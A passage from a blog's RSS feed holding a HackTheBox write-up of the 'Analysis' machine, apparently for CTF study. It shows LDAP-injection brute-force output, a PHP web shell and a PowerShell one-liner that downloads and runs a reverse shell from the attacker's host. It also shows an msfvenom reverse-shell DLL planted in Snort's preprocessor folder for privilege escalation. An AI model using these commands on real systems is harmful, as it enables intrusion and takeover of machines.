Testing % &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;URL: http://internal.analysis.htb/Users/list.php?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;%26&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;objectClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;97NTtl%2A4QP96Bv%25&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Testing ^ &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;URL: http://internal.analysis.htb/Users/list.php?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;%26&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;objectClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;97NTtl%2A4QP96Bv%5E&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Testing &amp;amp; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;URL: http://internal.analysis.htb/Users/list.php?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;%26&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;objectClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;97NTtl%2A4QP96Bv%26&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Testing &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;URL: http://internal.analysis.htb/Users/list.php?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;%26&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;objectClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;97NTtl%2A4QP96Bv%2A&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Testing &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;URL: http://internal.analysis.htb/Users/list.php?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;%26&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;objectClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;97NTtl%2A4QP96Bv%28&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Testing &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;URL: http://internal.analysis.htb/Users/list.php?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;%26&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;objectClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;97NTtl%2A4QP96Bv%29&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Testing _ &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;URL: http://internal.analysis.htb/Users/list.php?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;%26&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;objectClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;97NTtl%2A4QP96Bv_&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Testing + &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;URL: http://internal.analysis.htb/Users/list.php?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;%26&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;objectClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;97NTtl%2A4QP96Bv%2B&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Testing &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;URL: http://internal.analysis.htb/Users/list.php?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;%26&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;objectClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;97NTtl%2A4QP96Bv%3D&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Testing - &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;URL: http://internal.analysis.htb/Users/list.php?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;%26&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;objectClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;97NTtl%2A4QP96Bv-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Round 2 password is: &lt;span class=&quot;s1&quot;&gt;&apos;&amp;lt;redacted&amp;gt;&apos;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; Attempting login...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Login successful!
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Password is: &lt;span class=&quot;s1&quot;&gt;&apos;&amp;lt;redacted&amp;gt;&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With the password at our disposal, we can log into the admin interface:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/analysis08.png&quot; alt=&quot;admin interface&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;step-2---getting-foothold&quot;&gt;&lt;a href=&quot;#step3-foothold&quot;&gt;&lt;/a&gt;Step 2 - Getting foothold&lt;/h2&gt;

&lt;p&gt;Poking around a little bit, we find an upload funcionality at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dashboard/form.php&lt;/code&gt;. Since the website seems to be rendering PHP, let’s upload a PHP script containing the following:&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&amp;lt;h1&amp;gt;hi mom&amp;lt;/h1&amp;gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;../figs/analysis09.png&quot; alt=&quot;first upload response&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see from the response, the file was uploaded. Now, we need to find the endpoint where the uploads are stored. Let’s use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt; to find it:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://internal.analysis.htb/dashboard/FUZZ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; usr/share/wordlists/dirbuster/directory-list-1.0.txt &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt;
img
uploads
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see, it is located at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dashboard/uploads&lt;/code&gt;. Accessing the page under the name of the file we uploaded:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/analysis10.png&quot; alt=&quot;uploaded php page&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Since this is a Windows machine, let’s first upload a webshell and get a reverse shell from it. For that, we will use the following PHP script:&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GET&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;basename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;PHP_SELF&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;TEXT&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cmd&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;autofocus&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cmd&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;size=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;80&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SUBMIT&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Execute&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;pre&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;cmd&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;cmd&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/pre&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After uploading it under the name of concha.php and accessing it, we find the following page:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/analysis11.png&quot; alt=&quot;web-shell&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can test our web-shell by sending the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whoami&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/analysis12.png&quot; alt=&quot;whoami in webshell&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ok, now we need a one-liner reverse shell to feed this form field. First, we will download &lt;a href=&quot;https://github.com/martinsohn/PowerShell-reverse-shell/blob/main/powershell-reverse-shell.ps1&quot;&gt;this&lt;/a&gt; PowerShell reverse shell code on our local machine and save it under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell-payload.ps1&lt;/code&gt;. Change everything necessary there, such as your IP address and port. Now we open a Python server where we saved the payload with&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 2323
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally, we use this powershell command as promp to our web-shell: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;powershell -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&apos;http://&amp;lt;your-ip&amp;gt;:2323/shell-payload.ps1&apos;)&quot;&lt;/code&gt;. Before running it, we open a new netcat listener on the port we passed in the payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell-payload.ps1&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/analysis13.png&quot; alt=&quot;rev-shell&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And we get the reverse shell as the web service account!&lt;/p&gt;

&lt;h2 id=&quot;step-3---system-enumeration&quot;&gt;&lt;a href=&quot;#step3-crafting-the-attack&quot;&gt;&lt;/a&gt;Step 3 - System enumeration&lt;/h2&gt;

&lt;p&gt;Let’s upload PrivescCheck.ps1 (you can find it &lt;a href=&quot;https://github.com/itm4n/PrivescCheck&quot;&gt;here&lt;/a&gt;) using the upload functionality within the website. Then, we can simply run it inside the shell by typing in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;. .\PrivescCheck.ps1; Invoke-PrivescCheck&lt;/code&gt;. We will then find a pair of credentials that can be used to log in as a user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jdoe&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/analysis14.png&quot; alt=&quot;creds&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s use Evil-WinRM to connect with this user and spawn a more stable shell:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.129.223.1 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; jdoe &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &amp;lt;redacted&amp;gt;

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\j&lt;/span&gt;doe&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;analysis&lt;span class=&quot;se&quot;&gt;\j&lt;/span&gt;doe

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\j&lt;/span&gt;doe&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ../Desktop
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\j&lt;/span&gt;doe&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls


    &lt;/span&gt;Directory: C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\j&lt;/span&gt;doe&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop


Mode                LastWriteTime         Length Name
&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-ar---&lt;/span&gt;        1/23/2024  10:33 PM             34 user.txt


&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\j&lt;/span&gt;doe&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
71d78169aa06bb5f7d5b1e6fd7babd81
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now that we are inside, let’s take a look again at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PrivescCheck.ps1&lt;/code&gt;. After some greps here and there, I’ve found these lines:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/analysis15.png&quot; alt=&quot;snort svc&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After some research, I’ve found &lt;a href=&quot;https://www.cvedetails.com/cve/CVE-2016-1417/&quot;&gt;this&lt;/a&gt; CVE about dll hijack. In this exploit an attacker would place arbitrary code under tcapi.dll and run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snort.exe&lt;/code&gt; to open any pcap file. Unfortunately, that did not work. I had to dig a little deeper…&lt;/p&gt;

&lt;p&gt;During my research, I found &lt;a href=&quot;https://www.spencerdrayton.co.uk/blog/snort-custom-dynamic-preprocessor/&quot;&gt;this&lt;/a&gt; reference saying snort uses dynamic preprocessors for various network traffic analysis tasks. These preprocessors are dynamically loaded at runtime from the snort_dynamicpreprocessor directory.&lt;/p&gt;

&lt;p&gt;This mechanism of dynamically loading preprocessors provides significant flexibility. But, there’s a catch. Since Snort will load these preprocessors without much questioning, someone could sneak in a bad preprocessor – kind of like a rogue app – into the folder where Snort looks for them. This folder is located at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Snort\lib\snort_dynamicpreprocessor&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;-step-4---privilege-escalation&quot;&gt;&lt;a href=&quot;#solving&quot;&gt;&lt;/a&gt; Step 4 - Privilege escalation&lt;/h2&gt;
&lt;p&gt;With that in mind, let’s create a reverse shell with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt; to create a malicious dll and upload it to the dynamic preprocessor:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/x64/shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.10.14.153 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4444 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; dll &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; sf_shell.dll
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, we open our netcat on port 4444 and download this dll from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jdoe&lt;/code&gt; user shell we have access to with the following command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Invoke-WebRequest &lt;span class=&quot;nt&quot;&gt;-Uri&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.14.153:1234/sf_shell.dll&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-OutFile&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sers&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\j&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;doe&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;esktop&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f_shell.dll&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Don’t forget to start a Python server on port 1234 in the directory containing the dll shell. After that, we run the following command on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jdoe&lt;/code&gt; shell:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;upload sf_shell.dll c:&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;nort&lt;span class=&quot;se&quot;&gt;\l&lt;/span&gt;ib&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;nort_dynamicpreprocessor
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And then we wait…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/analysis17.png&quot; alt=&quot;root shell&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And we got root!&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;In this CTF, we learned a lot more about LDAP injection techniques and Snort. We were able to retrieve sensitive information using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kerbrute&lt;/code&gt; by first gathering possible and valid emails. After that, with LDAP injection, we were able to guess the user’s password and log into the administrator panel. From there, we escalated our privileges using a web shell, granting us access as the web service. For lateral movement, we used PrivescCheck.ps1 and found leaked credentials.&lt;/p&gt;

&lt;p&gt;After successfully logging in the leaked user credentials’ account, we escalated privileges by uploading a maliciously crafted dll into the snort dynamic preprocessor’s directory, which then spawned us the root shell.&lt;/p&gt;

&lt;p&gt;It was nice ride, for sure!&lt;/p&gt;

&lt;p&gt;I hope you liked this write-up and learned something new. As always, don’t forget to do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Wed, 24 Jan 2024 00:00:00 -0300</pubDate>
        <link>http://localhost:4000//analysis-htb</link>
        <link href="http://localhost:4000/analysis-htb"/>
        <guid isPermaLink="true">http://localhost:4000/analysis-htb</guid>
      </item>
    
      <item>
        <title>FriendZone - HackTheBox</title>
        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;

&lt;p&gt;Hello there, virgins. Today we are going to be solving the worst problem ever: owning FriendZone on HackTheBox. Jokes aside, this is a an easy difficulty machine that will provide us more knowledge about DNS zone transfers.
You can access this box &lt;a href=&quot;https://app.hackthebox.com/machines/173&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h1 id=&quot;challenge-description&quot;&gt;&lt;a href=&quot;#level-description&quot;&gt;&lt;/a&gt;Challenge description&lt;/h1&gt;

&lt;p&gt;For the leve description, we have:&lt;/p&gt;

